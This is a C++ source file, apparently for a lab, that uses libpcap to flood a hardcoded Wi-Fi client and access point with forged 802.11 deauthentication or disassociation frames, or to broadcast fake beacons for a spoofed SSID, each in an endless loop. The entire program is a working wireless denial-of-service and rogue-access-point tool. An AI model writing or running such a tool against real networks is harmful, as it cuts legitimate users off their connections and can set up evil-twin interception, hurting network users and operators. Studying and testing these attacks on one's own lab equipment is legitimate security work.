#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <chrono>
#include <thread>
#include <pcap.h>
#include <unistd.h>

// Standard 26-byte RadioTap header compatible with modern Linux kernel drivers
const uint8_t eth_radiotap[26] = {
    0x00, 0x00, 0x1a, 0x00, 0x2f, 0x40, 0x00, 0xa0, 
    0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0x85, 0x09, 
    0xa0, 0x04, 0xb0, 0x00, 0x10, 0x00, 0x00, 0x00, 
    0x10, 0x00
};

// Injection Vectors
void inject_deauth(pcap_t* handle, const uint8_t* target_mac, const uint8_t* ap_mac) {
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), eth_radiotap, eth_radiotap + 26);
    uint8_t frame_control[2] = {0xc0, 0x00}; 
    uint8_t duration[2] = {0x00, 0x00};
    uint8_t reason_code[2] = {0x07, 0x00}; 
    packet.insert(packet.end(), frame_control, frame_control + 2);
    packet.insert(packet.end(), duration, duration + 2);
    packet.insert(packet.end(), target_mac, target_mac + 6); 
    packet.insert(packet.end(), ap_mac, ap_mac + 6);         
    packet.insert(packet.end(), ap_mac, ap_mac + 6);         
    uint8_t seq_ctrl[2] = {0x00, 0x00};
    packet.insert(packet.end(), seq_ctrl, seq_ctrl + 2);
    packet.insert(packet.end(), reason_code, reason_code + 2);
    pcap_sendpacket(handle, packet.data(), packet.size());
}

void inject_disassoc(pcap_t* handle, const uint8_t* target_mac, const uint8_t* ap_mac) {
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), eth_radiotap, eth_radiotap + 26);
    uint8_t frame_control[2] = {0xa0, 0x00}; 
    uint8_t duration[2] = {0x00, 0x00};
    uint8_t reason_code[2] = {0x06, 0x00}; 
    packet.insert(packet.end(), frame_control, frame_control + 2);
    packet.insert(packet.end(), duration, duration + 2);
    packet.insert(packet.end(), target_mac, target_mac + 6);
    packet.insert(packet.end(), ap_mac, ap_mac + 6);
    packet.insert(packet.end(), ap_mac, ap_mac + 6);
    uint8_t seq_ctrl[2] = {0x00, 0x00};
    packet.insert(packet.end(), seq_ctrl, seq_ctrl + 2);
    packet.insert(packet.end(), reason_code, reason_code + 2);
    pcap_sendpacket(handle, packet.data(), packet.size());
}

void inject_beacon(pcap_t* handle, const std::string& ssid) {
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), eth_radiotap, eth_radiotap + 26);
    uint8_t frame_control[2] = {0x80, 0x00}; 
    uint8_t duration[2] = {0x00, 0x00};
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t fake_ap_mac[6] = {0x00, 0x11, 0x22, 0x33, (uint8_t)(rand() % 255), (uint8_t)(rand() % 255)};
    packet.insert(packet.end(), frame_control, frame_control + 2);
    packet.insert(packet.end(), duration, duration + 2);
    packet.insert(packet.end(), broadcast_mac, broadcast_mac + 6); 
    packet.insert(packet.end(), fake_ap_mac, fake_ap_mac + 6);    
    packet.insert(packet.end(), fake_ap_mac, fake_ap_mac + 6);    
    uint8_t seq_ctrl[2] = {0x00, 0x00};
    packet.insert(packet.end(), seq_ctrl, seq_ctrl + 2);
    uint8_t fixed_params[12] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x64,0x00, 0x11,0x04};
    packet.insert(packet.end(), fixed_params, fixed_params + 12);
    packet.push_back(0x00); 
    packet.push_back(ssid.length()); 
    packet.insert(packet.end(), ssid.begin(), ssid.end());
    uint8_t rates[10] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    packet.insert(packet.end(), rates, rates + 10);
    pcap_sendpacket(handle, packet.data(), packet.size());
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <deauth|disassoc|beacon>\n";
        return 1;
    }

    std::string mode = argv[1];
    
    // --- EXACT HARDCODED NETWORK VARIABLES ---
    const char* wifi_card = "wlp2s0"; // Using wlp2s0
    uint8_t target_sta[6] = {0xc8, 0xb2, 0x9b, 0x0d, 0x65, 0xe2};   // Laptop 1 Client MAC
    uint8_t target_bssid[6] = {0xfc, 0x01, 0x2c, 0xee, 0x1c, 0x39}; // ESP32 AP BSSID

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(wifi_card, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        std::cerr << "[-] Error opening interface: " << errbuf << std::endl;
        return 1;
    }

    std::cout << "=================================================================\n"
              << "[*] WIRELESS LAYER 2 ENGINE INITIATED -> INTERFACE: " << wifi_card << "\n"
              << "[*] Mode: " << mode << " | Status: Injecting targeted parameters...\n"
              << "=================================================================\n";

    uint64_t count = 0;
    std::srand(std::time(nullptr));

    if (mode == "deauth") {
        while (true) {
            inject_deauth(handle, target_sta, target_bssid);
            count++;
            if (count % 500 == 0) std::cout << "\r[+] Deauth Injection benchmark: " << count << " frames deployed..." << std::flush;
            std::this_thread::sleep_for(std::chrono::milliseconds(2));
        }
    } 
    else if (mode == "disassoc") {
        while (true) {
            inject_disassoc(handle, target_sta, target_bssid);
            count++;
            if (count % 500 == 0) std::cout << "\r[+] Disassoc Injection benchmark: " << count << " frames deployed..." << std::flush;
            std::this_thread::sleep_for(std::chrono::milliseconds(2));
        }
    } 
    else if (mode == "beacon") {
        std::string ssid = "ESP32_Lab_Simulation";
        while (true) {
            inject_beacon(handle, ssid);
            count++;
            if (count % 500 == 0) std::cout << "\r[+] Broadcast benchmark: " << count << " beacons deployed..." << std::flush;
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
    }

    pcap_close(handle);
    return 0;
}
